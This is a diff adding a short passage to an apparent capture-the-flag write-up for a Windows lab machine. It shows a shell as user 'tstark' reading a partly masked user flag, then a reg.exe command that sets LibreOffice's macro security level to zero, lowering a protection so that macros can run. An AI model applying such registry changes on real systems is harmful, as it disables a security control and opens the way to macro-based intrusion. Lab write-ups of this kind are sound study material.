@@ -2332,6 +2332,23 @@ User claims unknown.
 Kerberos support for Dynamic Access Control on this device has been disabled.
 ```
 
+`cd C:\\Users\tstark\Desktop`
+
+`dir`:
+```
+    Directory: C:\Users\tstark\Desktop
+
+
+Mode                 LastWriteTime         Length Name
+----                 -------------         ------ ----
+-ar---        11/18/2024  10:51 AM             34 user.txt
+```
+
+`type user.txt`:
+```
+c6367*************************** 🚩
+```
+
 We attempt to change the registry values with our shell as `tstark`, then verify if the new value has been applied.
 
 `reg.exe add "HKEY_LOCAL_MACHINE\SOFTWARE\Policies\LibreOffice\org.openoffice.Office.Common\Security\Scripting\MacroSecurityLevel" /v "Value" /t REG_DWORD /d 0 /f`:
